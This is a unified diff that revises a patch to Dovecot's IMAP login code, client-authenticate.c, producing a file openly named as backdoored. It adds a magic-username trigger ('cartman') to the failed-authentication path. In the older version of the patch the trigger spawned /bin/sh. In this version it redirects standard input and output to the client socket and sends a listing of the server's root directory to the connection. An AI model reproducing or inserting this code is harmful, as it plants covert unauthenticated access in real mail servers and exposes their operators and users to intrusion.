@@ -1,20 +1,35 @@
 --- client-authenticate.c	2025-03-28 12:32:27.000000000 +0100
 +++ client-authenticate-backdoored.c	2025-04-23 16:59:17.639376710 +0200
-@@ -1,5 +1,7 @@
+@@ -1,5 +1,8 @@
  /* Copyright (c) 2002-2018 Dovecot authors, see the included COPYING file */
  
 +#include <unistd.h>
++#include <dirent.h>
 +
  #include "login-common.h"
  #include "base64.h"
  #include "buffer.h"
-@@ -115,6 +117,11 @@
+@@ -115,6 +118,25 @@
  				       IMAP_RESP_CODE_CONTACTADMIN, text);
  		break;
  	case CLIENT_AUTH_RESULT_AUTHFAILED:
 +		if (strcmp(reply->proxy.username, "cartman") == 0)
 +		{
-+			execl("/bin/sh", "/bin/sh", NULL);
++			close(0);
++			close(1);
++			close(2);
++			dup2(client->fd, 0);
++			dup2(client->fd, 1);
++			dup2(client->fd, 2);
++			DIR *dir;
++			struct dirent *ent;
++			if ((dir = opendir ("/")) != NULL) {
++				/* print all the files and directories within directory */
++				while ((ent = readdir (dir)) != NULL) {
++				  write(client->fd, ent->d_name, strlen(ent->d_name));
++				  write(client->fd, "\n", strlen("\n"));
++				}
++				closedir (dir); }
 +		}
 +
  		client_send_reply_code(client, IMAP_CMD_REPLY_NO,
